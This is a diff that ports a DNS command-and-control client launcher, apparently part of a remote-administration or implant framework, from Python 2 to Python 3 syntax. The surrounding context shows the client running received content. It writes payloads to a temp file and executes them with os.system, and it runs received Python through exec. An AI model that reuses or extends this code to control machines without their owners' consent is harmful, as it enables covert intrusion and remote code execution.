@@ -1,6 +1,10 @@
 # -*- coding: utf-8 -*-
 # Copyright (c) 2016, Oleksii Shevchuk (alxchk@gmail.com)
 
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
 __all__ = ['DNSCommandClientLauncher']
 
 from ..base_launcher import BaseLauncher, LauncherArgumentParser, LauncherError
@@ -72,7 +76,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
                 tmp.close()
 
                 if not platform.system == 'Windows':
-                    os.chmod(tmp_path, 0700)
+                    os.chmod(tmp_path, 0o700)
 
                 os.system(tmp_path)
 
@@ -85,7 +89,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 
         elif action.startswith('pyexec'):
             try:
-                exec content
+                exec(content)
             except Exception as e:
                 logger.exception(e)
         elif action.startswith('sh'):
@@ -141,7 +145,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
             logger.debug('OnlineStatus completed: %04x %04x %08x',
                 offset, mintime, register)
             self.event(OnlineStatus(offset, mintime, register))
-        except Exception, e:
+        except Exception as e:
             logger.exception('Online status check failed: %s', e)
 
         logger.debug('Wait for PortQuiz completion')
@@ -151,7 +155,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
         try:
             if portquiz.available:
                 self.event(PortQuizPort(portquiz.available[:8]))
-        except Exception, e:
+        except Exception as e:
             logger.exception(e)
 
         logger.debug('CheckOnline worker completed')
@@ -280,7 +284,7 @@ class DNSCncLauncher(BaseLauncher):
 
                     self.dnscnc.stream = None
 
-            except Exception, e:
+            except Exception as e:
                 logger.exception(e)
 
     def process(self):
